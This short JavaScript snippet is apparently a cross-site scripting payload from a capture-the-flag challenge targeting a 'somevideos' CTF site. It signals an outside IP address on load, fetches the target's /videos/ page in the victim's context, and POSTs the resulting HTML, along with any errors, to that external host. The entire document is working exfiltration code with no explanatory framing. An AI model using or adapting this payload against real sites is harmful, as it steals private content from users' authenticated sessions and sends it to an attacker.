fetch('https://140.113.24.143/?loaded')

fetch('https://somevideos.appsecil.ctf.today/videos/').then(function (response) {
    // The API call was successful!
    return response.text();
}).then(function (html) {
    // This is the HTML from our response as a text string
    fetch('https://140.113.24.143/?videos', {
    method: 'post',
    body: html
  })
}).catch(function (err) {
    // There was an error
    fetch('https://140.113.24.143/?error=' + err)
});